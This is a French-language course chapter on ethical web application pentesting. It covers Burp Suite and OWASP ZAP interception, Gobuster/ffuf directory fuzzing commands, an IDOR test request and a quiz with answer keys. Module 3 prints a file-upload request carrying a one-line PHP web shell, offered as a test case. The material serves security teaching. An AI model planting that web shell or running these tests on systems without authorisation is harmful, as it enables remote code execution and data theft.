# TOME P2 — Réseaux & Télécoms — Jour 86 (6h) : Sécurité Offensive Web — Pentesting Applicatif & Outils d'Audit (Burp Suite & OWASP ZAP)

> [!NOTE]
> **Objectif du jour :** Maîtriser les techniques de tests d'intrusion applicatifs web (Web Application Pentesting) : interception et modification de trafic HTTP/HTTPS avec Burp Suite et OWASP ZAP, découverte de répertoires masqués (Gobuster/ffuf), exploitation de vulnérabilités applicatives (SQLi, XSS, CSRF, File Upload) et rédaction de rapports de remédiation.
>
> **Compétences visées :** `SEC-05` (A) — Pentesting Web Éthique | `BIT-06` (A) — Audit de Sécurité des Applications Web

---

## 1) Module — Proxy d'Interception HTTP/HTTPS : Burp Suite & OWASP ZAP (2h)

### 📖 Narration/Intuition

Un navigateur web classique masque la majorité des échanges entre le client et le serveur : en-têtes HTTP, cookies masqués, requêtes AJAX, paramètres transmis en arrière-plan.

Pour auditer une application web, l'auditeur intercale un **Proxy d'Interception** (Burp Suite ou OWASP ZAP) entre le navigateur et le serveur web. Chaque requête transmise par le navigateur est mise en pause. L'auditeur peut inspecter le contenu brut, modifier les variables (tampering), forcer des valeurs interdites ou rejouer la requête modifiée pour tester la réaction des contrôles de sécurité du serveur.

### 🔍 Anatomie Technique

**Architecture d'un Proxy d'Interception :**

```
Browser (Firefox / Chrome)
        │ 
        │ 1. Requête HTTP/HTTPS (ex: POST /api/virement)
        ▼
┌─────────────────────────────────────────────────────────────┐
│              PROXY D'INTERCEPTION (BURP SUITE / ZAP)         │
│  - Écoute sur 127.0.0.1:8080                                │
│  - Certificat CA Racine Burp/ZAP installé dans le navigateur │
│  - Inspection & Modification manuelle du corps/headers      │
│  - Outils : Repeater, Intruder, Decoder, Scanner            │
└────────────────────────┬────────────────────────────────────┘
                         │ 
                         │ 2. Requête Altérée transmise au serveur
                         ▼
Serveur Web Cible (https://banque.bcc.cd)
```

**Principales fonctionnalités de Burp Suite / OWASP ZAP :**

```
- Proxy / Intercept : Arrête les requêtes en temps réel pour modification avant envoi.
- Repeater : Permet de rejouer une même requête HTTP plusieurs fois en modifiant manuellement des paramètres.
- Intruder / Fuzzer : Automatise l'envoi de requêtes avec des dictionnaires de charges utiles (Payloads).
- Target / Site Map : Cartographie arborescente complète de l'application auditée.
- Scanner (Version Pro / ZAP Active Scan) : Scan automatique des vulnérabilités OWASP Top 10.
```

---

## 2) Module — Fuzzing Web & Enumération de Contenu (Gobuster & ffuf) (2h)

### 📖 Narration/Intuition

Les développeurs laissent parfois des fichiers de sauvegarde, des interfaces d'administration cachées ou des endpoints d'API non documentés sur le serveur web (ex: `/admin_old`, `/.git`, `/config.json`, `/api/v2/debug`). Ces éléments ne sont pas référencés par des liens HTML.

Le **Fuzzing Web** consiste à tester automatiquement des milliers de mots issus d'un dictionnaire (Wordlist) contre le serveur web pour découvrir ces ressources masquées.

### 🔍 Anatomie Technique

**Énumération de répertoires et fichiers avec Gobuster et ffuf :**

```bash
# ─── 1. Énumération de répertoires web avec Gobuster ───────────────────────────
gobuster dir -u https://portail-audit.bcc.cd/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,js,json,bak \
  -b 404,403 \
  -k  # Ignorer les avertissements de certificats SSL auto-signés

# ─── 2. Fuzzing d'API & Paramètres avec ffuf (Fast Web Fuzzer) ───────────────
# Recherche d'endpoints masqués
ffuf -u https://api-audit.bcc.cd/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc 200,301,302

# Fuzzing de paramètres HTTP GET (recherche de paramètres cachés)
ffuf -u https://portail-audit.bcc.cd/page.php?FUZZ=1 \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -fs 4240  # Filtrer les réponses d'une taille spécifique (bruit)
```

---

## 3) Module — Scénarios d'Exploitation & Méthodologie d'Audit (2h)

### 📖 Narration/Intuition

Un pentest web ne consiste pas à exécuter des scanners automatiques. Il suit une méthodologie rigoureuse basée sur le guide **OWASP Web Security Testing Guide (WSTG)** pour vérifier méthodiquement chaque contrôle de sécurité.

### 🔍 Anatomie Technique

**Scénarios d'audit pratiques :**

```bash
# ─── 1. Test d'Insecure Direct Object Reference (IDOR) ────────────────────────
# Scénario : L'utilisateur connecté possède l'ID 105.
# En modifiant l'ID dans Burp Repeater vers 106, accède-t-on au compte d'autrui ?
GET /api/v1/user/106/statement HTTP/1.1
Host: banque.bcc.cd
Authorization: Bearer <Token_Utilisateur_105>

# Réponse attendue d'une application sécurisée : 403 Forbidden
# Réponse révélant une vulnérabilité IDOR : 200 OK avec les données du compte 106

# ─── 2. Test de Téléversement de Fichier Malveillant (Unrestricted File Upload) ──
# Scénario : Upload de photo de profil. L'application vérifie-t-elle l'extension et le type MIME ?
POST /account/avatar HTTP/1.1
Host: banque.bcc.cd
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="cmd.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--

# Si le serveur enregistre et exécute cmd.php -> Vulnérabilité Remote Code Execution (RCE) !
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **WSTG** | Web Security Testing Guide — Guide méthodologique officiel d'audit web par l'OWASP |
| **Fuzzing** | Technique d'injection automatique de données aléatoires ou structurées pour déceler des failles |
| **CSRF** | Cross-Site Request Forgery — Forgerie de requête inter-sites |
| **RCE** | Remote Code Execution — Exécution de code à distance |
| **SSTI** | Server-Side Template Injection — Injection dans les moteurs de modèles côté serveur |

---

## 🏋️ Exercices & Corrigés

**Exercice 1 :** Lors d'un pentest web avec Burp Suite, quelle est la fonction du composant **Repeater** et en quoi diffère-t-il du composant **Intruder** ?

**Corrigé :** Le **Repeater** permet à l'auditeur de modifier manuellement une requête HTTP interceptée et de la renvoyer au serveur autant de fois que nécessaire pour observer en détail la réponse du serveur (analyse manuelle fine). L'**Intruder** est un outil automatisé qui prend une requête modèle et y injecte une liste de charges utiles (wordlist) sur des emplacements prédéfinis pour effectuer des attaques automatisées (ex: brute-force de mots de passe, fuzzing de paramètres).

**Exercice 2 :** Comment la présence d'un jeton Anti-CSRF (CSRF Token) protège-t-elle une application bancaire contre les attaques par forgerie de requête inter-sites ?

**Corrigé :** Un jeton Anti-CSRF est une valeur aléatoire, unique et imprévisible générée par le serveur et liée à la session courante de l'utilisateur. Lorsqu'un formulaire sensible est soumis (ex: virement), l'application exige ce jeton. Un site tiers malveillant qui tente d'émettre une requête à l'insu de l'utilisateur ne peut pas deviner ni lire ce jeton (grâce à la Same-Origin Policy du navigateur), ce qui provoque le rejet de la requête par le serveur.

---

## ❓ Banque de Questions & Test du Jour

**Q1 :** Pour intercepter et modifier le trafic HTTPS d'un navigateur avec un proxy d'interception comme Burp Suite ou OWASP ZAP, que doit-on installer au préalable dans le magasin de certificats du navigateur ?
- A) La clé privée du serveur bancaire cible
- B) Le certificat CA racine généré par Burp Suite / OWASP ZAP
- C) Une extension VPN commerciale
- D) Le code source de l'application web

**Réponse : B**

**Q2 :** Quel outil en ligne de commande est spécialement conçu pour effectuer de l'énumération ultra-rapide de fichiers et répertoires web par dictionnaire (Fuzzing) ?
- A) Wireshark
- B) ffuf (ou Gobuster)
- C) Ping
- D) Traceroute

**Réponse : B**

**Q3 :** Quelle vulnérabilité se produit lorsqu'une application web permet le téléversement de fichiers exécutables (ex: scripts `.php` ou `.jsp`) dans un répertoire accessible par le serveur Web sans validation ?
- A) Cross-Site Scripting (XSS)
- B) Remote Code Execution (RCE) via Unrestricted File Upload
- C) SQL Injection
- D) Broken Links

**Réponse : B**

**Q4 :** Quel guide de l'OWASP fournit la méthodologie de référence complète pour la réalisation de tests d'intrusion applicatifs web ?
- A) OWASP Top 10
- B) OWASP WSTG (Web Security Testing Guide)
- C) OWASP SAMM
- D) OWASP Dependency-Check

**Réponse : B**

**Q5 :** Quelle est la meilleure pratique pour empêcher les attaques par injection de commandes système (Command Injection) dans une application web ?
- A) Utiliser des fonctions d'exécution shell directes (`os.system` ou `eval`)
- B) Éviter complètement l'appel aux commandes shell système et utiliser des APIs / bibliothèques natives du langage, ou valider strictement les paramètres avec une liste blanche (whitelist)
- C) Activer le mode incognito du navigateur
- D) Augmenter la mémoire RAM du serveur

**Réponse : B**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
